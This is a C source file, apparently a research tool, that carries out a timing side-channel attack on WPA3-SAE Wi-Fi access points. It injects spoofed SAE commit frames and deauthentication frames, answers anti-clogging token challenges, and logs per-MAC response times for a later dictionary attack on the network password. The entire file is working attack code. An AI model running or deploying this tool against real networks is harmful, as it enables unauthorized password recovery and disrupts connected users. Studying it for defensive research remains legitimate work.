#include <err.h>
#include <signal.h>
#include <poll.h>
#include <assert.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/timerfd.h>
#include <sys/stat.h>
#include <openssl/ec.h>
#include <aircrack-ng/osdep/osdep.h>

#include "dragontime.h"
#include "utils.h"

static struct state *get_state(void) { return &_state; }

static void open_card(struct state *state, char *dev, int chan) {
	printf("Opening card %s\n", dev);
	if ((state->wi = wi_open(dev)) == NULL)
		err(1, "wi_open()");

	printf("Setting chan %d\n", chan);
	if (wi_set_channel(state->wi, chan) == -1)
		err(1, "card_set_chan()");
}

static int card_read(struct state *state, void *buf, int len, struct rx_info *ri) {
	int rc;

	if ((rc = wi_read(state->wi, NULL, 0, buf, len, ri)) == -1)
		err(1, "wi_read()");

	return rc;
}

static int card_write(struct state *state, void *buf, int len, struct tx_info *ti) {
	return wi_write(state->wi, NULL, 0, buf, len, ti);
}

static void inject_sae_commit(struct state *state) {
	unsigned char buf[2048] = {0};

	if (!state->started_attack)
		return;

	int len;
	switch (state->group) {
		case 22:
			len = AUTH_REQ_SAE_COMMIT_GROUP_22_SIZE;
			memcpy(buf, AUTH_REQ_SAE_COMMIT_GROUP_22, len);
			break;
		case 23:
			len = AUTH_REQ_SAE_COMMIT_GROUP_23_SIZE;
			memcpy(buf, AUTH_REQ_SAE_COMMIT_GROUP_23, len);
			break;
		case 24:
			len = AUTH_REQ_SAE_COMMIT_GROUP_24_SIZE;
			memcpy(buf, AUTH_REQ_SAE_COMMIT_GROUP_24, len);
			break;
		default:
			return;
	}

	memcpy(buf + 4, state->bssid, 6);
	memcpy(buf + 10, state->srcaddr, 6);
	memcpy(buf + 16, state->bssid, 6);

	if (card_write(state, buf, len, NULL) == -1)
		perror("card_write");

	clock_gettime(CLOCK_MONOTONIC, &state->prev_commit);
	state->got_reply = 0;
}

static void inject_deauth(struct state *state) {
	unsigned char *buf = DEAUTH_FRAME;

	memcpy(buf + 4, state->bssid, 6);
	memcpy(buf + 10, state->srcaddr, 6);
	memcpy(buf + 16, state->bssid, 6);

	if (card_write(state, buf, DEAUTH_FRAME_SIZE, NULL) == -1)
		perror("card_write");
}

static void queue_next_commit(struct state *state) {
	struct itimerspec timespec;

	/* initial expiration of the timer */
	timespec.it_value.tv_sec = 0;
	timespec.it_value.tv_nsec = state->delay * 1000 * 1000;
	/* periodic expiration of the timer */
	timespec.it_interval.tv_sec = 0;
	timespec.it_interval.tv_nsec = 0;

	if (timerfd_settime(state->time_fd_inject, 0, &timespec, NULL) == -1)
		perror("timerfd_settime()");
}

static void process_packet(struct state *state, unsigned char *buf, int len) {
	int pos_bssid, pos_src;

	//printf("process_packet: %d\n", len);

	/* Ignore retransmitted frames */
	if (buf[1] & 0x08) {
		//printf("Ignoring retransmission\n");
		return;
	}

	/* Extract addresses */
	switch (buf[1] & 3) {
		case 0:
			pos_bssid = 16;
			pos_src = 10;
			break;
		case 1:
			pos_bssid = 4;
			pos_src = 10;
			break;
		case 2:
			pos_bssid = 10;
			pos_src = 16;
			break;
		default:
			pos_bssid = 10;
			pos_src = 24;
			break;
	}

	/* Sent by AP */
	if (memcmp(buf + pos_bssid, state->bssid, 6) != 0
	    || memcmp(buf + pos_src, state->bssid, 6) != 0)
		return;

	/* Detect Beacon - Inject commit frames every second */
	if (buf[0] == 0x80 && !state->started_attack) {
		time_t t = time(NULL);
		struct tm tm = *localtime(&t);

		printf("Detected AP! Starting timing attack at %d-%02d-%02d %02d:%02d:%02d\n", tm.tm_year + 1900,
		       tm.tm_mon + 1, tm.tm_mday, tm.tm_hour, tm.tm_min, tm.tm_sec);
		fprintf(state->fp, "Starting at %d-%02d-%02d %02d:%02d:%02d\n", tm.tm_year + 1900,
		        tm.tm_mon + 1, tm.tm_mday, tm.tm_hour, tm.tm_min, tm.tm_sec);

		state->started_attack = 1;
		inject_sae_commit(state);
	}
	/* Detect Authentication frames */
	else if (len >= 24 + 8 &&
	         buf[0] == 0xb0 && /* Type is Authentication */
	         buf[24] == 0x03 /*&&*/ /* Auth type is SAE */
		/*buf[26] == 0x01*/) /* Sequence number is 1 */
	{
		/* Check if status is good and its the first reply */
		if (buf[28] == 0x00) {
			struct timespec curr, diff;

			clock_gettime(CLOCK_MONOTONIC, &curr);
			if (curr.tv_nsec > state->prev_commit.tv_nsec) {
				diff.tv_nsec = curr.tv_nsec - state->prev_commit.tv_nsec;
				diff.tv_sec = curr.tv_sec - state->prev_commit.tv_sec;
			} else {
				diff.tv_nsec = 1000000000 + curr.tv_nsec - state->prev_commit.tv_nsec;
				diff.tv_sec = curr.tv_sec - state->prev_commit.tv_sec - 1;
			}

			state->sum_time[state->curraddr] += diff.tv_nsec;
			state->num_injected[state->curraddr] += 1;

			// Write measurement to file
			fprintf(state->fp, "STA %02X: %ld\n", state->curraddr, diff.tv_nsec / 1000);

			// Also provide output to the screen
			printf("STA %02X: %ld miliseconds (TOTAL %d)\n", state->curraddr, diff.tv_nsec / 1000,
			       state->num_injected[state->curraddr]);
			if (state->curraddr == 0 && state->num_injected[state->num_addresses - 1] > 0) {
				printf("-------------------------------\n");
				for (int i = 0; i < state->num_addresses; ++i)
					printf("Address %02X = %ld\n", i, state->sum_time[i] / (state->num_injected[i] * 1000));
			}

			inject_deauth(state);

			state->curraddr = (state->curraddr + 1) % state->num_addresses;
			state->srcaddr[5] = state->curraddr;
			queue_next_commit(state);
		}
		/* Status equals Anti-Clogging Token Required */
		else if (buf[28] == 0x4C) {
			unsigned char *token = buf + 24 + 8;
			int token_len = len - 24 - 8;
			unsigned char reply[2048] = {0};
			size_t reply_len = 0;

			/* fill in basic frame */
			switch (state->group) {
				case 22:
					reply_len = AUTH_REQ_SAE_COMMIT_GROUP_22_SIZE;
					memcpy(reply, AUTH_REQ_SAE_COMMIT_GROUP_22, reply_len);
					break;
				case 23:
					reply_len = AUTH_REQ_SAE_COMMIT_GROUP_23_SIZE;
					memcpy(reply, AUTH_REQ_SAE_COMMIT_GROUP_23, reply_len);
					break;
				case 24:
					reply_len = AUTH_REQ_SAE_COMMIT_GROUP_24_SIZE;
					memcpy(reply, AUTH_REQ_SAE_COMMIT_GROUP_24, reply_len);
					break;
				default:
					return;
			}

			/* token comes after status and group id, before scalar and element */
			int pos = 24 + 8;
			memmove(reply + pos + token_len, reply + pos, reply_len - pos);
			memcpy(reply + pos, token, token_len);
			reply_len += token_len;

			/* set addresses */
			memcpy(reply + 4, state->bssid, 6);
			memcpy(reply + 10, buf + 4, 6);
			memcpy(reply + 16, state->bssid, 6);

			if (card_write(state, reply, reply_len, NULL) == -1)
				perror("card_write");
			clock_gettime(CLOCK_MONOTONIC, &state->prev_commit);
		}

		/* Status equals unsupported group */
		else if (buf[28] == 0x4d) {
			printf("WARNING: Authentication rejected due to unsupported group\n");
		} else {
			printf("WARNING: Unrecognized status 0x%02X 0x%02X\n", buf[28], buf[29]);
		}
	}
}

static int card_receive(struct state *state) {
	unsigned char buf[2048];
	int len;
	struct rx_info ri;

	if ((len = card_read(state, buf, sizeof(buf), &ri)) < 0) {
		fprintf(stderr, "%s: failed to read packet\n", __FUNCTION__);
		return -1;
	}

	process_packet(state, buf, len);

	return len;
}

static void check_timeout(struct state *state) {
	struct timespec curr, diff;

	if (!state->started_attack)
		return;

	clock_gettime(CLOCK_MONOTONIC, &curr);
	if (curr.tv_nsec > state->prev_commit.tv_nsec) {
		diff.tv_nsec = curr.tv_nsec - state->prev_commit.tv_nsec;
		diff.tv_sec = curr.tv_sec - state->prev_commit.tv_sec;
	} else {
		diff.tv_nsec = 1000000000 + curr.tv_nsec - state->prev_commit.tv_nsec;
		diff.tv_sec = curr.tv_sec - state->prev_commit.tv_sec - 1;
	}

	if (diff.tv_nsec > state->timeout * 1000 * 1000) {
		inject_deauth(state);
		queue_next_commit(state);
	}
}

static void event_loop(struct state *state, char *dev, int chan) {
	struct pollfd fds[3];
	struct itimerspec timespec;

	// 1. Open the card and get the MAC address
	open_card(state, dev, chan);
	wi_set_rate(state->wi, USED_RATE);
	wi_get_mac(state->wi, state->srcaddr);

	// 2. Display all info we need to perform the dictionary attack & also write it to file
	printf("Targeting BSSID %02X:%02X:%02X:%02X:%02X:%02X\n", state->bssid[0], state->bssid[1],
	       state->bssid[2], state->bssid[3], state->bssid[4], state->bssid[5]);
	printf("Will spoof MAC addresses in the form %02X:%02X:%02X:%02X:%02X:[00-%02X]\n", state->srcaddr[0],
	       state->srcaddr[1], state->srcaddr[2], state->srcaddr[3], state->srcaddr[4], state->num_addresses - 1);
	printf("Performing attack using group %d\n", state->group);
	printf("Using a retransmit timeout of %d ms, and a delay between commits of %d ms\n", state->timeout, state->delay);

	fprintf(state->fp, "BSSID %02X:%02X:%02X:%02X:%02X:%02X\n", state->bssid[0],
	        state->bssid[1], state->bssid[2], state->bssid[3], state->bssid[4], state->bssid[5]);
	fprintf(state->fp, "Spoofing %02X:%02X:%02X:%02X:%02X:[00-%02X]\n", state->srcaddr[0],
	        state->srcaddr[1], state->srcaddr[2], state->srcaddr[3], state->srcaddr[4], state->num_addresses - 1);
	fprintf(state->fp, "Group %d\n", state->group);
	fprintf(state->fp, "Timeout %d\n", state->timeout);
	fprintf(state->fp, "Delay %d\n", state->delay);

	// 3. Initialize further things to start the attack
	state->srcaddr[5] = state->curraddr;

	// 4. Initialize periodic timer to detect timeouts
	int timer_fd = timerfd_create(CLOCK_MONOTONIC, 0);
	if (timer_fd == -1)
		perror("timerfd_create()");

	/* initial expiration of the timer */
	timespec.it_value.tv_sec = 1;
	timespec.it_value.tv_nsec = 0;
	/* periodic expiration of the timer */
	timespec.it_interval.tv_sec = 0;
	timespec.it_interval.tv_nsec = 100 * 1000 * 1000;

	// 5. Initialize timer used to queue a new commit frame to inject
	if (timerfd_settime(timer_fd, 0, &timespec, NULL) == -1)
		perror("timerfd_settime()");

	state->time_fd_inject = timerfd_create(CLOCK_MONOTONIC, 0);
	if (timer_fd == -1)
		perror("timerfd_create()");

	// 6. Now start the main event loop
	printf("Searching for AP ...\n");
	while (1) {
		int card_fd = wi_fd(state->wi);

		memset(&fds, 0, sizeof(fds));
		fds[0].fd = card_fd;
		fds[0].events = POLLIN;
		fds[1].fd = timer_fd;
		fds[1].events = POLLIN;
		fds[2].fd = state->time_fd_inject;
		fds[2].events = POLLIN;

		if (poll(fds, 3, -1) == -1)
			err(1, "poll()");

		if (fds[0].revents & POLLIN)
			card_receive(state);

		// This timer is periodically called, detects timeouts, and implicity starts the attack
		if (fds[1].revents & POLLIN) {
			uint64_t exp;
			// WPA3_ATTACK
			if (read(timer_fd, &exp, sizeof(uint64_t)) != sizeof(uint64_t)) {
				printf("read timer_fd fail\n");
			}
			// assert(read(timer_fd, &exp, sizeof(uint64_t)) == sizeof(uint64_t));
			check_timeout(state);
		}

		// This timer is set when a new commit is queued after receiving a reply or a timeout
		if (fds[2].revents & POLLIN) {
			uint64_t exp;
			assert(read(state->time_fd_inject, &exp, sizeof(uint64_t)) == sizeof(uint64_t));
			inject_sae_commit(state);
		}
	}
}

static void sighandler(int signum) {
	struct state *state = get_state();

	if (signum == SIGPIPE || signum == SIGINT) {
		time_t t = time(NULL);
		struct tm tm = *localtime(&t);

		if (state->fp != NULL)
			fprintf(state->fp, "Stopping at %d-%02d-%02d %02d:%02d:%02d\n", tm.tm_year + 1900, tm.tm_mon + 1,
			        tm.tm_mday, tm.tm_hour, tm.tm_min, tm.tm_sec);
		else
			printf("Stopping at %d-%02d-%02d %02d:%02d:%02d\n", tm.tm_year + 1900, tm.tm_mon + 1, tm.tm_mday,
			       tm.tm_hour, tm.tm_min, tm.tm_sec);

		exit(0);
	}
}

int main(int argc, char *argv[]) {
	char *device = NULL;
	int ch;
	int chan = 1;
	struct state *state = get_state();

	srand(time(NULL));

	memset(state, 0, sizeof(*state));
	state->curraddr = 0;
	state->debug_level = 1;
	state->group = 24;
	state->delay = 250;
	state->timeout = 750;
	state->num_addresses = 20;

	while ((ch = getopt(argc, argv, "d:a:g:i:t:o:")) != -1) {
		switch (ch) {
			case 'g':
				state->group = atoi(optarg);
				if (state->group < 22 || state->group > 24) {
					printf("Invalid group. Can only attack groups 22, 23, 24.\n");
					return 1;
				}

			case 'd':
				device = optarg;
				break;

			case 'a':
				if (getmac(optarg, 1, state->bssid) != 0) {
					printf("Invalid AP MAC address.\n");
					return 1;
				}
				break;

			case 'i':
				state->delay = atoi(optarg);
				if (state->delay < 1) {
					printf("Please enter an delay above zero\n");
					return 1;
				}
				break;

			case 't':
				state->timeout = atoi(optarg);
				if (state->timeout < 1) {
					printf("Please enter a timeout above zero\n");
					return 1;
				}
				break;

			case 'o':
				state->output_file = strdup(optarg);
				break;

			default:
				break;
		}
	}

	signal(SIGPIPE, sighandler);
	signal(SIGINT, sighandler);

	if (state->output_file == NULL) {
		fprintf(stderr, "Please provide an output file using the -o parameter\n");
		exit(1);
	}

	state->fp = fopen(state->output_file, "w");
	if (state->fp == NULL) {
		fprintf(stderr, "Failed to open %s: ", state->output_file);
		perror("");
		exit(1);
	}
	chmod(state->output_file, 0766);

	event_loop(state, device, chan);
	exit(0);
}
